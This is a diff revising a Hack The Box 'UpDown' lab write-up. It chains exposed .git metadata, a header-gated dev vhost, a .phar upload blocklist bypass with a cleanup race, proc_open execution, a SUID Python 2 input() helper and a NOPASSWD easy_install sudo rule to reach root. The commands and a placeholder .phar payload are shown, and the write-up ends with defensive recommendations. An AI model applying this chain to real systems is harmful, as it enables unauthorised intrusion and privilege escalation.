@@ -1,5 +1,5 @@
 ---
-title: "Availability Checker — Git Exposure, Race Condition, and Unsafe Privilege Boundaries"
+title: "UpDown — Exposed Git Metadata, Upload Race, and Privileged Interpreter Abuse"
 description: "Exposed version-control metadata and a custom-header development virtual host lead to an upload blocklist bypass and race condition for a web-service shell; a SUID Python 2 input() helper and a package-installer sudo rule reach root."
 type: case-study
 platform: Hack The Box
@@ -13,28 +13,64 @@ tags:
   - race-condition
   - suid
   - python
+objective: "Escalate from exposed version-control metadata and an upload race to web-service code execution, then to application-user and root access through a SUID Python 2 helper and an over-broad package-installer sudo rule."
+tools:
+  - rustscan
+  - feroxbuster
+  - git-dumper
+  - gobuster
+  - curl
+  - netcat
+  - python
+  - ssh
+  - easy_install
+skill: "Chaining web-source exposure, an upload race, and unsafe privileged interpreter patterns to root"
+outcome: "Web-service shell via a `proc_open` payload, application-user access via the SUID Python 2 `input()` helper, and root via the `easy_install` sudo rule"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Linux (Ubuntu); Apache 2.4.41 and a PHP availability checker |
+| Starting position | Unauthenticated network access |
+| Objective | Escalate from exposed version-control metadata and an upload race to web-service code execution, then to application-user and root access |
+| Outcome | Web-service shell, application-user access via the SUID Python 2 helper, and root via the `easy_install` sudo rule |
 
 ## Summary
 
-This Linux lab hosts a website availability checker. Initial access chains exposed version-control metadata, a custom-header gate on a development virtual host, and an upload handler with an incomplete extension blocklist and a race condition in its cleanup logic. Post-exploitation, privilege escalation abuses a SUID helper wrapping unsafe Python 2 `input()` and an overly broad package-installer sudo rule.
+UpDown is a Medium-rated Hack The Box Linux lab built around a website availability checker. The path opens with an exposed Git directory that leaks the development source and its weak header-based access control, continues through a `.phar` upload that bypasses an extension blocklist and races the checker's delayed cleanup, and finishes with a SUID Python 2 `input()` helper and an over-broad `easy_install` sudo rule. Domains, paths, headers, ports, and account names are replaced with role-based placeholders; command syntax and technique are preserved.
 
-All IPs shown are placeholders. Commands and output are sanitized representatives drawn from the lab notes.
+**Attack path:** **Exposed `.git` metadata → header-gated development vhost → `.phar` upload blocklist bypass → delayed-cleanup race → `proc_open` web-service shell → SUID Python 2 `input()` → application-user access → `NOPASSWD` `easy_install` sudo → root**
 
 ## Context and Objective
 
-The lab exposes SSH (port 22) and an Apache web server (port 80). The web application presents a basic availability checker. The objective is to achieve initial access, escalate to a user-level shell, and obtain root.
+- **Target:** an Ubuntu host exposing an Apache web server (port 80) and OpenSSH (port 22).
+- **Application:** a PHP website availability checker that accepts a list of URLs and reports whether each is reachable.
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** move from web enumeration to code execution, then to a user-level shell and root by abusing the application's upload handling and privileged local components.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Enumeration — Port Scan and Directory Discovery
+### 1. Enumeration and Exposed Version-Control Metadata
 
-A port scan identified OpenSSH 8.2p1 and Apache 2.4.41. The web page footer disclosed a lab domain, represented here as `<TARGET_DOMAIN>`, which was added to the local hosts file.
-
-Directory brute-forcing revealed a development path and exposed version-control metadata:
+Observation: the initial attack surface is small — SSH and Apache — and directory brute-forcing exposes a development path and its version-control metadata.
 
 ```bash
-feroxbuster --url http://<TARGET_DOMAIN>/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
+rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/UpDown-TCP
+```
+
+```text
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Is my Website up ?
+```
+
+```bash
+feroxbuster --url http://<TARGET_DOMAIN>/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox.result
 ```
 
 ```text
@@ -42,7 +78,11 @@ feroxbuster --url http://<TARGET_DOMAIN>/ --wordlist /usr/share/seclists/Discove
 301  GET  http://<TARGET_DOMAIN>/<DEVELOPMENT_PATH>/<VCS_METADATA> => http://<TARGET_DOMAIN>/<DEVELOPMENT_PATH>/<VCS_METADATA>/
 ```
 
-The exposed metadata was recovered locally with a repository-dumping tool. The recovered configuration gated access behind a custom HTTP header:
+The exposed repository was dumped locally, and the recovered `.htaccess` gated the development area behind a static header:
+
+```bash
+git-dumper http://<TARGET_DOMAIN>/<DEVELOPMENT_PATH>/<VCS_METADATA>/ git
+```
 
 ```apache
 SetEnvIfNoCase <DEVELOPMENT_HEADER> "<DEVELOPMENT_HEADER_VALUE>" Required-Header
@@ -51,64 +91,121 @@ Deny from All
 Allow from env=Required-Header
 ```
 
-This header gate is weak access control — anyone who recovers or guesses its values reaches the protected development application.
+Significance: a served Git directory exposes full application source, and header-based gating is weak access control — anyone who recovers or guesses the values reaches the protected development application.
 
-### Virtual Host Discovery
+Result: the development source is recovered, and access to it depends on a single static request header.
 
-Virtual host enumeration identified a development virtual host, represented as `<DEVELOPMENT_VHOST>`, which returned 403 without the custom header and exposed the development upload interface with it:
+### 2. Development Virtual Host
+
+Observation: the main host exposes no development panel, so hostname enumeration targets a second virtual host.
+
+```bash
+gobuster vhost --url http://<TARGET_DOMAIN>/ --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+```
+
+```text
+<DEVELOPMENT_VHOST> Status: 403 [Size: 281]
+```
 
 ```bash
 curl -i -H '<DEVELOPMENT_HEADER>: <DEVELOPMENT_HEADER_VALUE>' http://<DEVELOPMENT_VHOST>/
 ```
 
-Content discovery on the development vhost found a browsable upload directory.
+The source records the development checker loading once the header was supplied; the `403` above is the only captured output for this transition. With the header applied, the virtual host exposes a development version of the checker that accepts an uploaded list of URLs, and content discovery finds a browsable `/uploads/` directory.
 
-### Source Code Analysis
+Significance: the protected application accepts uploads, and its reachability hinges entirely on a header value leaked in source.
 
-The leaked PHP source revealed two critical weaknesses in the upload handler:
+Result: the development upload interface and a browsable upload directory are identified.
 
-1. **Predictable upload path** — files land in `<UPLOAD_PATH>/<PREDICTABLE_DIRECTORY>/<FILENAME>`, making the directory guessable.
-2. **Extension blocklist** — the filter blocks `.php`, `.phtml`, `.py`, `.pl`, and archive formats, but `.phar` is not blocked. PHP interprets `.phar` files, making them a valid payload vector.
-3. **Delayed cleanup** — the uploaded file is deleted only after the URL checker finishes processing it, creating a race condition.
+### 3. Source Review — Upload Path, Blocklist, and Cleanup
 
-The exploitation plan:
+Observation: the leaked PHP source defines an upload handler with three exploitable properties.
 
-- Upload a server-interpreted file type that bypasses the extension blocklist.
-- Cause the checker to await a controlled external response so cleanup is delayed.
-- Request the uploaded file before the application deletes it.
+Predictable destination and delayed cleanup:
 
-### Initial Access — Upload Race and proc_open Shell
+```php
+$dir = "uploads/".md5(time())."/";
+if(!is_dir($dir)){ mkdir($dir, 0770, true); }
+$final_path = $dir.$file;
+move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
+```
 
-A controlled endpoint was used to delay the checker's outbound request:
+```php
+@unlink($final_path);
+```
+
+Extension filter (blocklist):
+
+```php
+$ext = getExtension($file);
+if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
+    die("Extension not allowed!");
+}
+```
+
+Significance: `md5(time())` produces a guessable directory name; the blocklist omits `.phar`, which this target's PHP still interprets as executable; and because the file is deleted only after the URL check completes, a stalled check leaves the upload on disk.
+
+Result: a payload format (`.phar`), a guessable path, and a race window are all identified from source.
+
+### 4. Initial Access — Upload Race and `proc_open`
+
+Observation: the checker fetches every supplied URL, so pointing it at a controlled listener stalls the request and delays cleanup.
+
+Action: hold a connection open while the `.phar` is uploaded.
 
 ```bash
 nc -lvnp <LISTENER_PORT>
 ```
 
-The uploaded file used a language-specific parser-stop marker so trailing data was not interpreted as code. The executable content is omitted.
+The uploaded file carried executable PHP followed by a parser-stop marker so the trailing fetch URL parsed as plain text rather than code:
 
-The file was uploaded through the development checker and the resulting path browsed:
+```text
+<?php <CODE>; __halt_compiler(); ?>
+http://<ATTACKER_HOST>:<LISTENER_PORT>
+```
 
 ```text
 http://<DEVELOPMENT_VHOST>/<UPLOAD_PATH>/<PREDICTABLE_DIRECTORY>/<UPLOADED_FILE>
 ```
 
-`phpinfo()` confirmed code execution but showed that common execution functions (`system`, `exec`, `shell_exec`, `popen`, `passthru`) are disabled via `disable_functions`. The function `proc_open` was not disabled, providing a viable alternative.
-
-The remaining enabled process-creation primitive was used to obtain command execution; the reverse-shell payload is omitted.
-
-After upload and race-condition trigger, a shell was received as the web-service account.
+`phpinfo()` confirmed code execution and revealed that common execution functions are disabled:
 
 ```text
-uid=<WEB_SERVICE_UID>(<WEB_SERVICE_ACCOUNT>)
+disable_functions:
+..., system, exec, shell_exec, popen, passthru, ..., fsockopen
 ```
 
-### Privilege Escalation — SUID Python 2 Helper
+`proc_open` was not disabled. A second `.phar` using it was uploaded the same way.
 
-An application-user home directory contained a SUID binary (`<SUID_HELPER>`) executable by the web-service group, alongside its Python 2 source:
+```text
+connect to [<ATTACKER_HOST>] from (UNKNOWN) [<TARGET_IP>]
+<WEB_SERVICE_ACCOUNT>@<TARGET_HOST>:<WEBROOT>$
+```
+
+```text
+uid=<WEB_SERVICE_UID>(<WEB_SERVICE_ACCOUNT>) gid=<WEB_SERVICE_GID>(<WEB_SERVICE_ACCOUNT>) groups=<WEB_SERVICE_GID>(<WEB_SERVICE_ACCOUNT>)
+```
+
+Significance: an incomplete extension blocklist plus a delayed-cleanup race converts a file upload into PHP execution, and `disable_functions` coverage gaps leave `proc_open` available for process creation.
+
+Result: command execution as the web-service account is obtained and confirmed.
+
+### 5. Privilege Escalation — SUID Python 2 Helper
+
+Observation: an application-user home directory contains a SUID binary and its Python source, executable by the web-service group.
+
+```bash
+ls -la /home/<APPLICATION_USER>/<SUID_HELPER_DIR>
+```
+
+```text
+-rwsr-x--- 1 <APPLICATION_USER> <WEB_SERVICE_ACCOUNT> 16928 <SUID_HELPER>
+-rwxr-x--- 1 <APPLICATION_USER> <WEB_SERVICE_ACCOUNT>   154 <SUID_HELPER>_test.py
+```
 
 ```python
 import requests
+
 url = input("Enter URL here:")
 page = requests.get(url)
 if page.status_code == 200:
@@ -117,61 +214,86 @@ else:
     print "Website is down"
 ```
 
-The `print "..."` syntax confirms Python 2. In Python 2, `input()` evaluates the provided string as Python code. In a SUID execution context (running as an application user), this becomes a privilege escalation primitive.
+Significance: the `print "..."` syntax confirms Python 2, where `input()` evaluates its argument as Python code. Combined with the SUID bit, the helper executes attacker-supplied Python in the application-user context.
 
-A Python expression was supplied as the "URL" input, causing the SUID helper to evaluate code. The privileged execution payload is omitted.
+Action: run the helper and supply a Python expression as the "URL" input. The source records the resulting shell as an awkward, non-interactive context, so this transition is narrative-only and no output from the helper itself was captured.
 
 ```bash
 ./<SUID_HELPER>
 ```
 
-This yielded a shell with application-user privileges. A private access key was present, but was not retained or used in this account.
+An SSH private key readable in the application-user context was then used for a stable session:
 
-```text
-uid=<APPLICATION_USER_UID>(<APPLICATION_USER>)
+```bash
+ssh -i <KEY_FILE> <APPLICATION_USER>@<TARGET_DOMAIN>
 ```
 
-### Root Escalation — Package Installer Sudo
-
-The application-user account had an unrestricted `NOPASSWD` sudo rule for a package installer:
-
 ```text
-(ALL) NOPASSWD: <PACKAGE_INSTALLER_PATH>
+uid=<APPLICATION_USER_UID>(<APPLICATION_USER>) gid=<APPLICATION_USER_GID>(<APPLICATION_USER>) groups=<APPLICATION_USER_GID>(<APPLICATION_USER>)
 ```
 
-The legacy Python package installer processes package setup logic. A package definition with privileged execution behavior was prepared; its executable content is omitted.
+Significance: a SUID wrapper around an interpreter turns ordinary input handling into a privilege boundary, and the recovered key converts transient code execution into a reusable login.
 
-Executed via the allowed sudo command:
+Result: an application-user shell is obtained and confirmed.
+
+### 6. Root — Package-Installer Sudo Rule
+
+Observation: the application-user account holds an unrestricted `NOPASSWD` sudo rule for a package installer.
+
+```bash
+sudo -l
+```
+
+```text
+User <APPLICATION_USER> may run the following commands on <TARGET_HOST>:
+    (ALL) NOPASSWD: <PACKAGE_INSTALLER_PATH>
+```
+
+Significance: the legacy Python package installer processes and executes package setup logic, so permitting it through sudo is equivalent to permitting arbitrary Python execution as root.
+
+Action: a local package whose `setup.py` spawns a shell was prepared.
 
 ```bash
 sudo <PACKAGE_INSTALLER_PATH> <LOCAL_PACKAGE_PATH>
 ```
 
-This spawned a root shell.
-
 ```text
-uid=0(root)
+whoami
+root
 ```
+
+Significance: allowing a build/install utility that executes project-controlled code through sudo grants root to any user who can reach it.
+
+Result: a root shell is obtained and confirmed.
 
 ## Challenges and Decisions
 
-- **Extension filtering bypass**: The blocklist approach missed `.phar`. An allowlist policy would have prevented this.
-- **Race condition exploitation**: The file cleanup delay was essential. The checker had to be stalled by pointing it at an attacker-controlled listener, keeping the uploaded file accessible long enough to trigger it manually.
-- **Restricted shell environment**: Common PHP execution functions were disabled. `proc_open` provided the necessary escape. Identifying available functions from `phpinfo()` output was a key diagnostic step.
-- **Python 2 `input()`**: The SUID helper used Python 2's `input()`, which evaluates arbitrary code. This is a well-known vulnerability class; the combination with SUID made it directly exploitable.
+- **Race-condition timing:** the uploaded file was deleted only after the URL check completed, so the outbound check was deliberately stalled against a controlled listener to hold the upload reachable long enough to be used.
 
 ## Outcome
 
-The lab was fully compromised: initial access as the web-service account via the upload race condition, escalation to an application-user account via the SUID Python 2 helper, and root via the package-installer sudo rule. All three escalation stages relied on distinct misconfigurations — incomplete extension filtering, unsafe interpreter usage in a SUID context, and an overly broad sudo entry for a package manager.
+The evidence establishes a web-service shell through the `.phar` upload and delayed-cleanup race, application-user access through the SUID Python 2 `input()` helper, and root through the `NOPASSWD` `easy_install` rule. The helper's resulting shell ran in an awkward, non-interactive context, so its success is corroborated by the subsequent SSH session rather than by captured output.
 
 ## Lessons and Recommendations
 
-- **Block access to `.git` directories and development paths.** Web servers must not serve version control metadata. Development virtual hosts should not be publicly accessible, and access control should not rely on static custom headers.
-- **Use allowlist-based upload validation.** Only explicitly required extensions and MIME types should be accepted. Uploaded files should be stored outside the web root, renamed to server-generated names, and served through a download handler rather than being directly executable.
-- **Avoid predictable upload paths.** `md5(time())` is guessable. Use cryptographically random directory names and prevent directory listing.
-- **Do not use SUID wrappers around interpreters or scripts.** Python 2 `input()` evaluates user input and should never be used with untrusted data. Any privileged helper should be small, compiled, audited, and designed around fixed operations rather than arbitrary input.
-- **Audit `NOPASSWD` sudo entries against GTFOBins.** Package managers and installer tools can execute attacker-controlled setup code. Restrict the exact package source and command arguments rather than allowing unrestricted execution.
+1. **Served version-control metadata and static header gates.** Serving `.git` disclosed full source and the header value that protected the development area. *Recommendation:* never serve version-control directories, keep development virtual hosts off the public surface, and replace static-header gating with real authentication and authorization.
+2. **Blocklist-based upload validation with predictable storage.** The handler blocked known-dangerous extensions but missed `.phar`, and stored uploads under guessable `md5(time())` directories. *Recommendation:* validate uploads against an explicit allowlist of extensions and MIME types, store files outside the web root under cryptographically random names, and serve them through a download handler rather than executing them.
+3. **Delayed cleanup creating a race window.** Deleting the upload only after the URL check left it momentarily reachable. *Recommendation:* delete temporary uploads immediately and avoid performing outbound requests that an uploader can stall while an executable file remains web-accessible.
+4. **SUID wrapper around an interpreter.** The helper ran Python 2 `input()` under a SUID bit, so supplied text was executed with the application user's privileges. *Recommendation:* never place SUID on interpreters or script wrappers; design privileged helpers as small, audited programs exposing fixed operations only, and treat readable private keys as a credential-exposure finding.
+5. **Over-broad `NOPASSWD` sudo rule for a package installer.** Allowing `easy_install` let a user execute project-controlled `setup.py` as root. *Recommendation:* audit `NOPASSWD` entries against known abuse paths, avoid granting package managers and build tools through sudo, and restrict privileged installs to fixed sources and arguments.
 
 ## References
 
-- Hack The Box Linux machine lab ([UpDown](https://app.hackthebox.com/machines/UpDown)); identity and internal identifier omitted.
+- [Hack The Box — UpDown](https://app.hackthebox.com/machines/UpDown) (retired machine)
+- [RustScan](https://github.com/RustScan/RustScan)
+- [feroxbuster](https://github.com/epi052/feroxbuster)
+- [git-dumper](https://github.com/arthaud/git-dumper)
+- [Gobuster](https://github.com/OJ/gobuster)
+- [curl — command line tool and library manual](https://curl.se/docs/manpage.html)
+- [Apache HTTP Server 2.4 Documentation](https://httpd.apache.org/docs/2.4/)
+- [Python 2 — `input()` built-in function](https://docs.python.org/2/library/functions.html#input)
+- [PHP — `proc_open`](https://www.php.net/manual/en/function.proc-open.php)
+- [PHP — `disable_functions` directive](https://www.php.net/manual/en/ini.core.php#ini.disable-functions)
+- [setuptools — `easy_install` (deprecated)](https://setuptools.pypa.io/en/latest/deprecated/easy_install.html)
+- [GTFOBins — `easy_install`](https://gtfobins.github.io/gtfobins/easy_install/)
+- [OpenSSH manuals](https://www.openssh.com/manual.html)
